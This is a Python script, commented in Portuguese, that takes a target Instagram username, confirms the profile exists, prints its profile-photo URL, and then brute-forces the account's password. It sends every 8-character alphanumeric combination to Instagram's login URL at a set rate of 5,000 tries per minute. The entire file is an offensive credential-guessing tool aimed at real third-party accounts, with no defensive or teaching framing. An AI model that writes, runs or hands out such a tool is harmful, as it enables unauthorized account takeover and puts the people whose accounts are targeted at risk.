import requests # type: ignore
import itertools
import string
from time import sleep
from bs4 import BeautifulSoup # type: ignore

# Função para testar a senha
def testar_senha(url, usuario, senha):
    payload = {
        'username': usuario,
        'password': senha
    }
    resposta = requests.post(url, data=payload)
    if 'login_error' not in resposta.text:
        print(f'Senha correta encontrada: {senha}')
        return True
    else:
        return False

# Função para buscar o usuário e exibir sua foto de perfil
def buscar_usuario(usuario):
    url = f"https://www.instagram.com/{usuario}/"
    resposta = requests.get(url)
    if resposta.status_code == 200:
        print(f"Usuário {usuario} encontrado.")
        soup = BeautifulSoup(resposta.text, 'html.parser')
        perfil = soup.find('meta', property='og:image')
        if perfil:
            print(f"Foto do perfil do usuário {usuario}: {perfil['content']}")
        else:
            print(f"Não foi possível encontrar a foto do perfil para o usuário {usuario}.")
        return True
    else:
        print(f"Não foi possível encontrar o usuário {usuario}.")
        return False

# Solicitar o nome de usuário alvo
usuario_alvo = input("Digite o nome de usuário alvo: ")

# Verificar se o usuário alvo existe
if not buscar_usuario(usuario_alvo):
    print("Usuário não encontrado. Tente novamente.")
else:
    # URL da página de login do Instagram
    url = 'https://www.instagram.com/login/'

    # Caracteres a serem usados na criação das senhas
    caracteres = string.ascii_letters + string.digits

    # Tamanho máximo da senha
    tamanho_max = 8

    # Gerando todas as combinações possíveis de senhas com o tamanho máximo
    combinacoes = itertools.product(caracteres, repeat=tamanho_max)

    tentativas_por_minuto = 5000
    milissegundos_por_tentativa = (60 * 1000) / tentativas_por_minuto

    for combinacao in combinacoes:
        senha = ''.join(combinacao)
        print(f'Testando senha: {senha}')
        if testar_senha(url, usuario_alvo, senha):
            break
        sleep(milissegundos_por_tentativa / 1000)  # Convertendo milissegundos para segundos
